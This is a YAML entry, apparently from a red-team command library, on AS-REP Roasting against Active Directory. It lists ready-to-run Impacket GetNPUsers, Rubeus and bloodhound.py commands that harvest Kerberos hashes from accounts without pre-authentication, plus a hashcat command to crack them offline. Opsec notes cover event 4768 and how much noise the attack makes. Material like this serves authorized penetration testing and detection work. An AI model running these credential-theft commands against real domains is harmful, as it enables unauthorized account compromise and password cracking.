name: ASREPRoasting
description: Request AS-REP for accounts without pre-auth and crack offline
commands:
- '# Impacket - target specific user (no auth required)'
- GetNPUsers.py -dc-ip <DC_IP> '<DOMAIN>/<TARGET_USER>' -no-pass -format hashcat
- ''
- '# Impacket - from users file'
- GetNPUsers.py -dc-ip <DC_IP> '<DOMAIN>/' -usersfile users.txt -format hashcat -outputfile hashes.txt
- ''
- '# Rubeus - all AS-REP roastable'
- Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
- ''
- '# Rubeus - target specific user'
- Rubeus.exe asreproast /user:<TARGET_USER> /format:hashcat /outfile:hashes.txt
- ''
- '# bloodhound.py - collect users to find AS-REP targets'
- bloodhound.py -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -d '<DOMAIN>' -dc '<DC_IP>' -c All
- ''
- '# Crack with hashcat (AS-REP)'
- hashcat -m 18200 hashes.txt wordlist.txt
opsec:
- AS-REP requests generate Kerberos event 4768 (TGT Request)
- Can be performed unauthenticated if username is known
- DONT_REQ_PREAUTH is rare - presence may indicate old/forgotten accounts
- Less noisy than Kerberoasting due to targeted nature
references:
- https://attack.mitre.org/techniques/T1558/004/
- https://www.thehacker.recipes/ad/movement/kerberos/asreproast
